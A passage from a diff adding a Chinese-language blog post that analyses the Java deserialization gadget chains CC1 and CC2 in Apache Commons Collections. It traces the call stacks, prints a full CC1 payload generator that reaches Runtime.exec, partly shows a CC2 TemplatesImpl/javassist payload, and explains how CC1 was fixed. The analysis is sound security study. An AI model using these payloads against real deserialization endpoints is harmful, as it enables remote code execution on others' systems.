+        var1<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        AnnotationType var2 <span class="token operator">=</span> null<span class="token punctuation">;</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            var2 <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var9<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        Map var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Iterator var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>这一句<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>调用了map的entrySet，完成了一条从readObject到RCE的完全路径<br><strong>外层的这个handler只是因为他刚好readObject可以触发这个代理类</strong></p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>因此最后再创建一个AnnotationInvocationHandler对象，并且把我们的代理类赋值进去，由此我们能拼凑出整个CC1的payload</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC1</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> InvocationHandler <span class="token function">getPayload</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">final</span> HashMap innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Map lazyMap <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> InvocationHandler temp <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Map mapProxy <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>temp<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Override<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> mapProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> handler<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>说过这个链其实不能用了，因为在远古远古版本就已经修掉了<br>维修的方法就是直接把memberValue改成定值，不可控了自然就没法反序列化了<br>新版readObject</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
+        ObjectInputStream<span class="token punctuation">.</span>GetField fields <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
+        Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token operator">></span> t <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token operator">></span><span class="token punctuation">)</span>fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
+        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> streamVals <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span><span class="token punctuation">)</span>fields<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memberValues"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// Check to make sure that types have not evolved incompatibly</span>
+
+        AnnotationType annotationType <span class="token operator">=</span> null<span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            annotationType <span class="token operator">=</span> AnnotationType<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>IllegalArgumentException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// Class is no longer an annotation type; time to punch out</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">>></span> memberTypes <span class="token operator">=</span> annotationType<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// consistent with runtime Map type</span>
+        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> mv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// If there are annotation members without values, that</span>
+        <span class="token comment" spellcheck="true">// situation is handled by the invoke method.</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> memberValue <span class="token operator">:</span> streamVals<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            String name <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            Object value <span class="token operator">=</span> null<span class="token punctuation">;</span>
+            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> memberType <span class="token operator">=</span> memberTypes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>memberType <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// i.e. member still exists</span>
+                value <span class="token operator">=</span> memberValue<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>memberType<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span>
+                      value <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    value <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>
+                            value<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> value <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span>
+                                annotationType<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+            mv<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        UnsafeAccessor<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        UnsafeAccessor<span class="token punctuation">.</span><span class="token function">setMemberValues</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> mv<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>最后一句强行设定了memberValue<br>跟了一下，影响的是内层用于触发LazyMap.get的那个handler，内层handler本来是代理的LazyMap类变成了代理LinkedHashMap类，然后走到get的时候走的是LinkedHashMap.get，计划大失败</p>
+<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>只能打Common Collections 4，需要极低版本，约等于没有用。因为在Common Collections 3中TransformingComparator这个类没有实现Serializable接口</p>
+<h3 id="调用栈-1"><a href="#调用栈-1" class="headerlink" title="调用栈"></a>调用栈</h3><pre class=" language-java"><code class="language-java">Gadget chain<span class="token operator">:</span>
+    ObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        PriorityQueue<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+            TransformingComparator<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                        Runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h3><p>这个类的特点是当调用其getOutputProperties方法时，会一路调用最终将自己的_bytecodes属性作为字节码进行类的加载，并进行类的实例化。使用javassit可以动态修改类的字节码，在类的static块中添加任意代码，并放到_bytecodes属性中触发，即可在类实例化时得到执行</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> Translet <span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>_name <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token comment" spellcheck="true">// The translet needs to keep a reference to all its auxiliary</span>
+            <span class="token comment" spellcheck="true">// class to prevent the GC from collecting them</span>
+            AbstractTranslet translet <span class="token operator">=</span> <span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">)</span> _class<span class="token punctuation">[</span>_transletIndex<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+    
+    
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>_bytecodes <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ErrorMsg err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ErrorMsg</span><span class="token punctuation">(</span>ErrorMsg<span class="token punctuation">.</span>NO_TRANSLET_CLASS_ERR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        TransletClassLoader loader <span class="token operator">=</span> <span class="token punctuation">(</span>TransletClassLoader<span class="token punctuation">)</span>
+            AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrivilegedAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">public</span> Object <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransletClassLoader</span><span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">.</span><span class="token function">findClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_tfactory<span class="token punctuation">.</span><span class="token function">getExternalExtensionsMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">final</span> <span class="token keyword">int</span> classCount <span class="token operator">=</span> _bytecodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+            _class <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span>classCount<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>classCount <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                _auxClasses <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> classCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                _class<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> loader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>_bytecodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>在defineTransletClasses中<code>_class[i] = loader.defineClass(_bytecodes[i]);</code>进行加载，而加载完成后在getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>进行实例化</p>
+<h3 id="从PriorityQueue到InvokerTransformer"><a href="#从PriorityQueue到InvokerTransformer" class="headerlink" title="从PriorityQueue到InvokerTransformer"></a>从PriorityQueue到InvokerTransformer</h3><p>顺着看吧，出发点必然是PriorityQueue的readObject方法，其最后调用了一个heapify()方法，听起来就是堆排序，而heapify方法里面也就只调用了一个函数siftDown，siftDown在comparator不为null时调用siftDownUsingComparator，siftDownUsingComparator调用comparator的compare方法（怪不得yso里面的链子打了省略号。。原来这一路上的函数调用连分叉都没有）</p>
+<p>看到TransformingComparator的compare方法，直接对自己的transformer进行transform了</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>I obj1<span class="token punctuation">,</span> I obj2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        O value1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        O value2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>decorated<span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p><strong>invokerTransformer可以调用一个类的public方法</strong>，所以直接调用templateImpl的getOutputProperties实现rce<br><strong>而templateImpl反序列化时可以执行任意长度任意数量的代码，约等于PHP的eval</strong></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span>TransformingComparator<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PriorityQueue<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC2</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        pool<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        CtClass cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Cat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
